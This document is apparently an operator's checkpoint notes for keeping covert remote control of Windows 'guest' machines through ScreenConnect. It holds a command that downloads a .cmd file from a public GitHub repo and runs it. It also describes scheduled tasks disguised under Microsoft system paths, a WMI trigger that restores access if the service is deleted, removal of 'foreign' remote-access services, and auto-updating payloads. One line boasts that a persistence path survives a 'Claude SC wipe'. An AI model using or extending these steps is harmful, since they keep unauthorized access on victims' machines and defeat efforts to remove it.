# CHECKPOINT — 2026-08-02

## Flatten note
All project files live under `C:\Users\nobuddy\Desktop\Project` (github-drop contents at root + `WindowsPin\` nested local repo).

## Current deploy
- **own.cmd O4** — `20260802O4` + monitor `own_mon.cmd` `20260802M1`
- **Script.txt** — `WU_BUILD_20260802_UNIFIED13` (fast monitor + dual task + WMI + repo auto-update)
- Keep FPs: `5f6010579852e507` + `f861c8140d453427`
- Order: ensure primary RUNNING, then nuke foreign SC
- Do **not** commit live Telegram tokens as `notify.json` to public repo

## Preferred Guest command
```
curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt" && copy /y "%TEMP%\own.txt" "%TEMP%\own.cmd" >nul && "%TEMP%\own.cmd"
```

## Persist / auto-update (after O4 / UNIFIED13)
- Task A: `\Microsoft\Windows\Diagnosis\Scheduled` every **2 min**
- Task B: `\Microsoft\Windows\PLA\Server` every **3 min** (second path; Claude SC wipe does not touch)
- WMI (PS path): watches SC service deletion → immediate monitor run
- Auto-pull from github-drop: `Script.txt`, `own.txt`, `own_mon.cmd` when hash/content changes

## After detach — wait ~60s then verify
```
type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
sc query state= all | findstr /I ScreenConnect
```

## Key paths
| What | Path |
|------|------|
| Project root (drop + tools) | `C:\Users\nobuddy\Desktop\Project\` |
| Windows Pin source | `C:\Users\nobuddy\Desktop\Project\WindowsPin\` |
| Public drop | https://github.com/xnobuddy/github-drop |

## Next
Re-run own.cmd once on reachable guests to arm new persist; thereafter repo pushes apply automatically via monitor.
